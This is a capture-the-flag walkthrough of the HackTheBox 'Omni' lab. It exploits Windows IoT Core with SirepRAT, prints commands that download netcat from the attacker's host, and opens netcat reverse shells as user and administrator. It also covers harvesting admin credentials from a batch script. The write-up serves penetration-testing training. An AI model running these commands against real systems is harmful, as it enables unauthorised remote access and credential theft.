<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Omni HacktheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/omni-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-09T15:50:58+00:00">January 9, 2021</time><time class="updated" datetime="2025-06-26T19:02:11+00:00">June 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<strong>Omni</strong>“. It’s available at HackTheBox for penetration testing practice. This laboratory is of an easy level, but with adequate basic knowledge to break the laboratories and if we pay attention to all the details we find during the examination it will not be complicated. The credit for making this lab goes to <strong><a style="color: #000000;" href="https://twitter.com/egre55">egre55</a></strong>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Easy</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the <strong>HackTheBox</strong> website.</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">Script PortScan &amp; nmap (<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/conceal-hackthebox-walkthrough/">Review Conceal</a></strong></span>)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Nikto</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Exploiting Windows IoT Core with SirepRAT.py</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Credentials theft in administrator scripts</span></li>
<li><span style="color: #000000;">Abuse of run command in Windows Device Portal</span></li>
</ul>
<ul>
<li><span style="color: #000000;"><strong>Capture the flag and decrypt with PSCredentials</strong></span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Reconnaissance</span></h3>
<p><span style="color: #000000;">As always, we insert an IP Address of box in “<strong>/etc/hosts</strong>” with the name “<strong>omni.htb</strong>“.</span></p>
<p><span style="color: #000000;">Firstly, we execute script <strong>PortScan</strong> (let’s remember view “<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/conceal-hackthebox-walkthrough/">Conceal</a></strong></span>” writeup).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e2DUMvYs2Ls/X_nEeUIOjFI/AAAAAAAAsqE/0-SAm1A6UYAS4dTK8kg2Dt8rzdffrATxQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Then, we execute <strong>nmap</strong> tool with the ports founds.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC -p135,8080,29817,29820 omni.htb -oN omni.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gItPioyfmyw/X_nEsYBZEFI/AAAAAAAAsqI/ytHR-ZMQ6BojydH7KVrlP6BNCxOf2kUBwCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">We access this web resource and we see that we need credentials for the access control panel.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-huJzzw_yr_U/X_nE4OGgD7I/AAAAAAAAsqQ/JbLuo3PgRYEAQtLvl6Jiwtqa4RbrzN4_gCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Then, we use the <strong>nikto</strong> tool and confirm that it is a Windows Device Portal IoT panel.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nikto -h omni.htb:8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LiZMjhOnBpM/X_nFBMSHCYI/AAAAAAAAsqY/9RIo015b1YcMfZbeIO6Uu3AsqdzTYv21ACLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Hence, we can search in Google about Windows Device Portal, we found <strong>IoT</strong> technology.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-07jHzZZJLZs/X_nFILA03xI/AAAAAAAAsqg/LtXofh0YNRsCO-l0m-N_JCm-M6gBt7WlgCLcBGAsYHQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">We search exploit for <strong>Windows IoT</strong>, we found this article of my friends from <strong><a style="color: #000000;" href="https://www.hackplayers.com/2019/03/exploit-para-ownear-Windows-IoT-Core.html">hackplayers</a></strong>.</span></p>
<p><span style="color: #000000;">And we download this script of <strong><a style="color: #000000;" href="https://github.com/SafeBreach-Labs/SirepRAT">Github SitepRAT</a></strong>. We will execute these two commands for a reverse shell in powershell.</span></p>
<p><span style="color: #000000;">1º- We up server in python and we download netcat in the victim machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-WebRequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.XX.XX/nc64.exe" --v</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1ZhTOdzdyOQ/X_nFUI4Bq_I/AAAAAAAAsqo/bauZY6V0fUIq2oTrfUy2v5YcSgSosjE1QCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">2º- We execute a command with netcat for a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\color\nc64.exe 10.10.XX.XX 443 -e powershell.exe"</pre>
<p><span style="color: #000000;">Yeah! We are in!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0EzM6B71Q0s/X_nFYXK1IEI/AAAAAAAAsqw/CD32MWIYUmAdhQm4eey6MfNIslP_JvWJACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Moreover, we found the “<strong>user.txt</strong>” file with “<strong>Get-ChildItem</strong>” command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ChildItem -Path C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue -Force</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D8yQuFTVT-Y/X_nFgjGqisI/AAAAAAAAsq0/baIX9U1-1AwWKuHuONNhb_rCUJuuyMzjgCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">For the moment we will leave it aside and continue listing the system.</span></p>
<h3><span style="color: #800000;">Privilege Escalation (Administrator)</span></h3>
<p><span style="color: #000000;">We search testing with various extensions file, we found three scripts in <strong>BAT</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ChildItem -Path C:\ -Filter *.bat -Recurse -ErrorAction SilentlyContinue -Force</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RRkRxaFJ1nM/X_nFpVwmYbI/AAAAAAAAsrA/xGmLfr4WXu4YvafDDeVqqjlPyuSoLQKQACLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Here, we find the administrator’s credentials in the “<strong>r.bat</strong>” file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TGtZ5ieNDjs/X_nFwGL7ccI/AAAAAAAAsrE/pD0tgIvpENkGfA2zQqKQnDTohwrLkQAggCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Afterwards, we back to control panel, we insert <strong>credentials</strong> and execute other <strong>netcat</strong> for obtaining reverser shell with the administrator.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.XX.XX 555 -e powershell.exe"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lTRCElAml5U/X_nF4MzwNaI/AAAAAAAAsrM/L_n3DUUGsXMHy9BPE6mhQEwiheBiDo0lwCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Nice work! We’re an administrator!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vIa0e8peV3I/X_nF9Dyd-DI/AAAAAAAAsrU/5_GvpD1vj-MM1RL_t-TAWtPJ1nperifRgCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Finally, we can use these commands for decrypt content flags files</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">credential = Import-CliXml -Path FILENAME.txt
credential.GetNetworkCredential().Password</pre>
<p><span style="color: #000000;"><strong><u>User flag:</u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KVMJxX_Mvgo/X_nGHA-FTnI/AAAAAAAAsrc/6LiV0J916pcUdsCbEP1NMro9wopUCNPigCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;"><strong><u>Administrator flag:</u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ok1LFrEhr4A/X_nGNQT4qqI/AAAAAAAAsro/sHn0XaIsnF843wjb6B24cFAAr-5ALR_oACLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong><span style="color: #000000;"> Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
